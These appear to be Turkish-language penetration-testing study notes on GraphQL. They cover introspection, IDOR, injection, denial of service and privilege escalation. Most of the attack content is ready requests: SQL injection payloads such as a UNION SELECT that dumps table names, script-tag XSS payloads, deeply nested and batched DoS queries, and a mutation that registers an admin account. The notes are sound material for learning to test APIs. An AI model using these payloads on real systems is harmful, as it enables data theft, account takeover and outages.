# GraphQL

## Tanım ve Temel Kullanımı

Bir GraphQL hizmeti, sorguları almak için genellikle tek bir uç nokta (endpoint) üzerinde çalışır
Bu uç nokta çoğunlukla `/graphql`, `/api/graphql` veya benzeri bir URL adresinde bulunur.

**Örneğin**, `users` sorgusunu çalıştırarak tüm `User` nesnelerinin `id`, `username` ve `role` alanlarını sorgulayabiliriz:

```http
GET /graphql
Host: example.com
Content-Type: application/json

{
  users {
    id
    username
    role
  }
}

```

**response**

```http
HTTP/2 200 OK
Content-Length: 217

{
  "data": {
    "users": [
      {
        "id": 1,
        "username": "htb-stdnt",
        "role": "user"
      },
      {
        "id": 2,
        "username": "admin",
        "role": "admin"
      }
    ]
  }
}
```

**Query Based requests**

```http
GET /graphql
Host: example.com
Content-Type: application/json

{
  users(username: "admin") {
    id
    username
    role
    // password bu kısımda eklenebilir
  }
}

```

**response**

```http
HTTP/2 200 OK
Content-Length: 217

{
  "data": {
    "users": [
      {
        "id": 2,
        "username": "admin",
        "role": "admin"
      }
    ]
  }
}
```

Bunun yanı sıra GraphQL sorguları, alt sorgulamayı destekler; bu da bir sorgunun, başka bir nesneye referans veren bir nesneden detaylar alabilmesini sağlar. Örneğin, bir `posts` (gönderiler) sorgusunun, bir kullanıcı nesnesi barındıran `author` (yazar) alanını döndürdüğünü varsayalım. Bu durumda, sorgumuz içerisinde yazarın kullanıcı adını ve rolünü şu şekilde sorgulayabiliriz:

```http
GET /graphql
Host: example.com
Content-Type: application/json

{
  posts {
    title
    author {
      username
      role
    }
  }
}


```

**response**

```http
HTTP/2 200 OK
Content-Length: 217

{
  "data": {
    "posts": [
      {
        "title": "Hello World!",
        "author": {
          "username": "htb-stdnt",
          "role": "user"
        }
      },
      {
        "title": "Test",
        "author": {
          "username": "test",
          "role": "user"
        }
      }
    ]
  }
}
```

## Exploit

### Information Disclosure

**İlk adım olarak, graphw00f aracını kullanarak web uygulamasının hangi GraphQL motorunu kullandığını tespit edeceğiz**

```bash
cd /opt

git clone https://github.com/dolevf/graphw00f.git

python3 main.py -d -f -t http://example.com

[*] Discovered GraphQL Engine: (Graphene)
[!] Attack Surface Matrix: https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/graphene.md
[!] Technologies: Python
```

**Görüldüğü üzere graphwoof aracı GraphQL motoru olarak Graphene'i tespit etti ayrıca Ayrıca, tespit edilen bu GraphQL motoru hakkında daha kapsamlı bilgiler sunan `GraphQL-Threat-Matrix`'teki ilgili ayrıntılı sayfaya da erişim sağlıyor**

### Introspection

GraphQL API'sine, arka uç sisteminin yapısı hakkında sorgu yapmalarını sağlayan bir GraphQL özelliğidir

**usage**

```http
GET /graphql
Host: example.com
Content-Type: application/json

{
  __schema {
    types {
      name
    }
  }
}
```

> Sonuçlar; **Int** veya **Boolean** gibi temel varsayılan türlerin yanı sıra, **UserObject** gibi tüm özel türleri de içerir:

```http
HTTP/2 200 OK
Content-Length: 69

{
 {"name":"UserObject"},
 {"name":"String"},
 {"name":"Boolean"},
}
```

**Artık bir türü bildiğimize göre, aşağıdaki iç gözlem (introspection) sorgusunu kullanarak bu türün tüm alanlarının adlarını öğrenebiliriz:**

```http
GET /graphql
Host: example.com
Content-Type: application/json

{
  __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

**sonuc**

```http
HTTP/2 200 OK
Content-Length: 69

{
     
        {
            "name":"username",
            "type":{
                "name":"String"
                "kind":"SCALAR"
            }
        },
        {
            "name":"password",
            "type":{
                "name":"String"
                "kind":"SCALAR"
            }
        },
    
}
```
### Introspection ile bütün verileri görelim

```graphql
query {
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}

```

<details>
  <summary>Introspection Output</summary>

```json
query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          ...FullType
        }
        directives {
          name
          description
          
          locations
          args {
            ...InputValue
          }
        }
      }
    }

    fragment FullType on __Type {
      kind
      name
      description
      
      fields(includeDeprecated: true) {
        name
        description
        args {
          ...InputValue
        }
        type {
          ...TypeRef
        }
        isDeprecated
        deprecationReason
      }
      inputFields {
        ...InputValue
      }
      interfaces {
        ...TypeRef
      }
      enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
      }
      possibleTypes {
        ...TypeRef
      }
    }

    fragment InputValue on __InputValue {
      name
      description
      type { ...TypeRef }
      defaultValue
    }

    fragment TypeRef on __Type {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                  }
                }
              }
            }
          }
        }
      }
    }
```
</details>

### IDOR


<details>
  <summary>Birinci adım</summary>

**ilk olarak schema içindeki typeslere bakıcaz**

```json
{__schema{types{name}}}

// responsede UserObject görücez
```
</details>
<details>
  <summary>ikinci adım</summary>

**şimdi bu UserObjectin fieldnameleri almamız lazım `idor` için**

```json
{__type(name:"UserObject"){name fields{name}}}

// responsede username, surname, role, msg gibi veriler görücez
```
</details>

</details>
<details>
  <summary>üçüncü adım</summary>

**şimdi bu username, surname, role, msg  gibi bilgileri çekicez**

```json
// ya bütün userleri listeleriz
{users{username role}}

// ya sadece sadece bir useri listeleriz username ile
// frklı userleri deneyelim
{user(username: "admin"){username role}}

```
</details>


### Injection Attacks Sql, Xss, Command Injection

#### sql
<details>
  <summary>
    Argüman (Parametre) İsteyen Sorguları Bulmak yada herhangi bir data alması gerekir
  </summary>

```json

{ users { username } }

// burada responsede username veya id gibi parametreler aldığını bilirsek

```
</details>


<details>
  <summary>username isminde bir argument beklediği biliyoruz ve burada test edicez</summary>

```json

{ user(username: "admin"){username id} }

// example atack

{user(username: "admin' OR SLEEP(5) -- -") { id uuid username } }

```
</details>

#### advance sql

**burada kaç adet fieldname dönüyor ise o kadar column name vardır örn 6**

```json
{
  __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```
+ `UNION SELECT 1,2,...,4,5,6` -> Toplam 6 kolon oluşturuyor (Kurala uymak için).
+ `GROUP_CONCAT(table_name)` -> İşin büyüsü burada. Veri tabanındaki tüm tabloların isimlerini yan yana aralarına virgül koyarak birleştirir ve tek bir kelime haline getirir. Bunu 3. sıraya yazdık çünkü GraphQL bize sadece 3. kolon olan `username`'i gösterebiliyor.

+ `FROM information_schema.tables` -> `MySQL` veri tabanlarında sistemdeki tüm tabloların isimlerinin kayıtlı olduğu gizli ana kütüphanedir.

+ `WHERE table_schema=database()-- -` -> "Sadece şu an içinde bulunduğum web sitesinin veri tabanındaki tabloları getir" der ve gerisini -- - ile yorum satırı yaparak devre dışı bırakır.

```json
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {
    username
  }
}

```



#### xss

##### 1. Senaryo: Yanıt İçeriğinin Doğrudan HTML'e Basılması
GraphQL sorgusundan dönen başarılı yanıtlar (response) frontend tarafında filtrelenmeden doğrudan DOM/HTML içine yerleştiriliyorsa tetiklenir.

*   **Örnek İstek (Request):**
    ```json
    {
      "query": "{ user(username: \"<script>alert(1)</script>\") { uuid username role } }"
    }
    ```
*   **İnceleme Noktası:** Dönen veri (başarılı veya null) frontend tarafından sayfaya nasıl basılıyor? Eğer temizleme (sanitization) yoksa tarayıcı betiği çalıştırır.

##### 2. Senaryo: Hata Mesajlarında Yansıma (Reflected XSS) 
En sık karşılaşılan ve en kritik GraphQL XSS senaryosudur. Sistem bir **Tip Uyuşmazlığı (Type Mismatch)** hatası ürettiğinde, hatalı girdiyi filtrelemeden hata mesajının içine gömer.

*   **Zafiyet Tetikleme Adımları:**
    1. Sistem `id` parametresinde bir **Integer (Tam Sayı)** beklemektedir.
    2. Saldırgan tam sayı yerine bilerek bir **String (Yazı)** yani XSS payload'u gönderir.

*   **Örnek İstek (Request):**
    ```json
    {
      "query": "{ post(id: \"<script>alert(1)</script>\") { id title body } }"
    }
    ```

*   **GraphQL Hata Yanıtı (Response):**
    ```json
    {
      "errors": [
        {
          "message": "Argument \"id\" has invalid value \"<script>alert(1)</script>\". Expected type \"Int\".",
          "locations": [{ "line": 1, "column": 11 }]
        }
      ]
    }
    ```
*   **Kritik Durum:** Saldırganın gönderdiği zararlı JavaScript kodu, GraphQL'in resmi hata mesajının (`errors.message`) içine hiçbir filtreye takılmadan aynen yansıtılmıştır. Bu hata mesajı kullanıcı ekranına basıldığı an XSS tetiklenir.




### Denial-of-Service (DoS) & Batching Attacks



1. GraphQL'de tablolar/nesneler birbirine bağlı olduğunda (örneğin bir `User` nesnesi `posts` alanına, `Post` nesnesi de tekrar `author` alanına işaret ediyorsa) iç içe sonsuz bir sorgu zinciri oluşturulabilir.

*   **Saldırı Mantığı:** Sunucuya sınırlandırılmamış, aşırı derin bir sorgu gönderilir:
    ```graphql
    query {
      user {
        posts {
          author {
            posts {
              author {
                # Bu zincir yüzlerce kat derine indirilir
              }
            }
          }
        }
      }
    }
    ```
*   **Sonuç:** Sunucu bu devasa ilişkisel veriyi veri tabanından çözmeye çalışırken aşırı CPU ve bellek tüketir, bir süre sonra yanıt veremez hale gelir (DoS).

2. Yığınlama Saldırıları (Batching Attacks)

GraphQL, tek bir HTTP isteği içinde aynı anda birden fazla sorgu göndermenize izin verir. Bu özellik kötüye kullanıldığında sunucu üzerinde ağır bir yük oluşturur.

*   **Saldırı Mantığı:** Tek bir istek içerisine yüzlerce veya binlerce bağımsız sorgu (veya takma ad - alias kullanılarak aynı sorgu) eklenerek sunucuya tek seferde gönderilir.
    ```graphql
    # Örnek 1: Dizi halinde çoklu istek gönderme
    [
      {"query": "{ post(id: 1) { title } }"},
      {"query": "{ post(id: 2) { title } }"} 
      # ... binlerce istek yan yana eklenir
    ]

    # Örnek 2: Alias (Takma ad) kullanarak tek sorguda yığınlama
    query {
      p1: post(id: 1) { title }
      p2: post(id: 2) { title }
      p3: post(id: 3) { title }
      # ... binlerce kez tekrarlanır
    }
    ```
**Atacker Notları**
*   Sızma testlerinde introspection ile ilişkisel harita çıkarıldıktan sonra iç içe sorguların (nested) ne kadar derine gidebildiği test edilmelidir.
*   Aynı HTTP isteği içinde gönderilebilecek maksimum sorgu sayısının sınırlandırılıp sınırlandırılmadığı (Batching Limit) kontrol edilmelidir.

### Mutation
**Mutasyonlar, sunucu verilerini değiştiren GraphQL sorgularıdır.**

<details>
  <summary>
   Introspection ile bütün schema cıkartma
  </summary>

```json
query {
  __schema {
    mutationType {
      name
      fields {
        name
        args {
          name
          defaultValue
          type {
            ...TypeRef
          }
        }
      }
    }
  }
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

**response**

```json
{"data":{"__schema":{"mutationType":{"name":"Mutation","fields":[{"name":"registerUser","args":[{"name":"input","defaultValue":null,"type":{"kind":"NON_NULL","name":null,"ofType":{"kind":"INPUT_OBJECT","name":"RegisterUserInput","ofType":null}}}]}]}}}}
```
</details>

<!--Yukarıda RegisterUserInput u gördük şimdi bunun bütün fieldlerini cıkartalım-->

```graphql
{   
  __type(name: "RegisterUserInput") {
    name
    inputFields {
      name
      description
      defaultValue
    }
  }
}
```
**response**
> **responseden anlıyoruzki username password role msg verilerini alıyormuş**

```graphql

{"data":{"__type":{"name":"RegisterUserInput","inputFields":[{"name":"username","description":null,"defaultValue":null},{"name":"password","description":null,"defaultValue":null},{"name":"role","description":null,"defaultValue":null},{"name":"msg","description":null,"defaultValue":null}]}}}
```


>> **örnek create için**

```bash
echo -n 'password' | md5sum

# output
5f4dcc3b5aa765d61d8327deb882cf99  -
```

**Hashed şifre ile, mutasyonu çalıştırarak nihayet yeni bir kullanıcı kaydedebiliriz:**

```graphql
mutation {
  registerUser(input: {username: "vautia", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "user", msg: "newUser"}) {
    user {
      username
      password
      msg
      role
    }
  }
}

```

>> **Örnek sömürü için**


```graphql

mutation {
  registerUser(input: {username: "vautiaAdmin", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "admin", msg: "Hacked!"}) {
    user {
      username
      password
      msg
      role
    }
  }
}
```


